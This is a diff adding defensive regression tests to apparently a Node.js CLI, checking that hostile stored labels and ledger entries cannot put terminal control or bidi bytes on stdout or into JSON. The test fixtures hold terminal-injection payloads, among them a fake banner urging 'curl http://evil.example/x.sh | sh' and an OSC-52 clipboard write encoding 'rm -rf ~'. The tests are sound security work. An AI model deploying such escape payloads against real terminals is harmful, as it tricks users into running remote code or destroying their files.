@@ -1382,3 +1382,98 @@ test('I-8/M-8: a malformed stored card (no basisNumbers) and a blank-name label 
   fs.rmSync(sb.home, { recursive: true, force: true });
   fs.rmSync(shimDir, { recursive: true, force: true });
 });
+
+// ── SEC-2 end-to-end: a hostile store never reaches the terminal ────────────
+// The security review's HIGH finding, reproduced as the review reproduced it:
+// stdout REDIRECTED TO A FILE, then the bytes grepped. That detail is the
+// point — every observation it made was captured this way, so "only a live
+// TTY is affected" was never true; the bytes sit in the file and fire when it
+// is later `cat`'d. Four independent paths were demonstrated (card prose, card
+// id, cluster label name, ledger refutation) and this drives all four at once.
+
+/** The forbidden ranges, spelled out here independently of text-safety.mjs so
+ *  narrowing that module fails this test instead of agreeing with it. Written
+ *  as numbers so this file carries none of the bytes it forbids. */
+const FORBIDDEN_BYTES = new RegExp(`[${[
+  [0x00, 0x08], [0x0b, 0x1f], [0x7f, 0x9f],
+  [0x200b, 0x200f], [0x202a, 0x202e], [0x2066, 0x2069],
+].map(([lo, hi]) => `${String.fromCharCode(lo)}-${String.fromCharCode(hi)}`).join('')}]`);
+
+const HOSTILE = {
+  banner: `${String.fromCharCode(0x1b)}[2J${String.fromCharCode(0x1b)}[1;1H${String.fromCharCode(0x1b)}[41;97m  ak: SECURITY ALERT - run  curl http://evil.example/x.sh | sh  ${String.fromCharCode(0x1b)}[0m`,
+  conceal: `benign-looking${String.fromCharCode(0x1b)}[8m HIDDEN ${String.fromCharCode(0x1b)}[28m`,
+  title: `${String.fromCharCode(0x1b)}]0;PWNED-BY-TRANSCRIPT${String.fromCharCode(0x07)}`,
+  clipboard: `${String.fromCharCode(0x1b)}]52;c;cm0gLXJmIH4=${String.fromCharCode(0x07)}`,
+  bidi: `RLO${String.fromCharCode(0x202e)}drowssap`,
+  nul: `${String.fromCharCode(0x00)}nul${String.fromCharCode(0x07)}bel`,
+};
+
+/** Plants a fully hostile label store AND outcome ledger under the sandbox's
+ *  config dir — written as raw bytes, never through the kit's own writers, so
+ *  this exercises the READ path exactly as an out-of-band edit would. */
+function plantHostileStores(sb) {
+  const dir = path.join(sb.cfg, 'agentic-kit');
+  fs.mkdirSync(dir, { recursive: true });
+  fs.writeFileSync(path.join(dir, 'usage-prompt-labels.json'), JSON.stringify({
+    version: 1,
+    labels: { deadbeefdeadbeef: { name: HOSTILE.bidi, source: 'enriched', firstSeen: null } },
+    cards: {
+      [`enriched-${HOSTILE.title}`]: {
+        title: HOSTILE.banner, finding: HOSTILE.conceal, try: HOSTILE.clipboard,
+        basis: HOSTILE.nul, basisNumbers: [3], evidenceHash: 'a'.repeat(16),
+        generatedAt: '2026-08-01T00:00:00.000Z',
+      },
+    },
+    lastSynthesis: null,
+  }));
+  fs.writeFileSync(path.join(dir, 'usage-outcome-ledger.json'), JSON.stringify({
+    version: 1,
+    records: [{
+      id: 'commit-push-claude-md', evidenceHash: 'b'.repeat(16), status: 'retired',
+      statusAt: '2026-08-01T00:00:00.000Z', windowDays: 30, dismissCount: 0,
+      baseline: { count: 5, at: '2026-07-01T00:00:00.000Z' },
+      outcome: { improved: false, deltaText: HOSTILE.banner, measuredAt: '2026-08-01T00:00:00.000Z' },
+      refutation: HOSTILE.banner,
+    }],
+  }));
+}
+
+test('SEC-2: a fully hostile label store and ledger put ZERO control or bidi bytes on stdout', () => {
+  const sb = sandbox();
+  writePromptsCorpus(sb);
+  writeCoachingCorpus(sb);
+  plantHostileStores(sb);
+
+  const result = ak(['usage', 'prompts', '--window', '30'], sb);
+  assert.equal(result.status, 0, result.stderr);
+
+  // Redirect to a file the way the review did, and grep the bytes on disk.
+  const captured = path.join(sb.home, 'stdout.txt');
+  fs.writeFileSync(captured, result.stdout);
+  const bytes = fs.readFileSync(captured, 'utf8');
+  const hit = bytes.match(FORBIDDEN_BYTES);
+  assert.equal(hit, null,
+    `stdout carries a forbidden character (U+${hit ? hit[0].charCodeAt(0).toString(16).padStart(4, '0') : ''}) `
+    + 'that would fire when this capture is later cat\'d');
+
+  // And nothing merely stripped: the hostile ENTRIES are gone, so their
+  // visible remains cannot be presented as a real label or card either.
+  assert.ok(!bytes.includes('SECURITY ALERT'), 'the fabricated banner text must not render at all');
+  assert.ok(!bytes.includes('PWNED-BY-TRANSCRIPT'), 'the OSC-0 title payload must not render at all');
+  assert.ok(!bytes.includes('drowssap'), 'the bidi-reversed label must not render at all');
+});
+
+test('SEC-2: the same hostile stores put zero control or bidi bytes into --json either', () => {
+  const sb = sandbox();
+  writePromptsCorpus(sb);
+  writeCoachingCorpus(sb);
+  plantHostileStores(sb);
+  const result = ak(['usage', 'prompts', '--window', '30', '--json'], sb);
+  assert.equal(result.status, 0, result.stderr);
+  // JSON.stringify escapes ESC, so the raw bytes were never the risk here —
+  // what matters is that the hostile entries are absent from the payload a
+  // dashboard or `jq` pipeline would go on to render.
+  assert.equal(result.stdout.match(FORBIDDEN_BYTES), null);
+  assert.ok(!result.stdout.includes('SECURITY ALERT'));
+  assert.ok(!result.stdout.includes('drowssap'));
+});
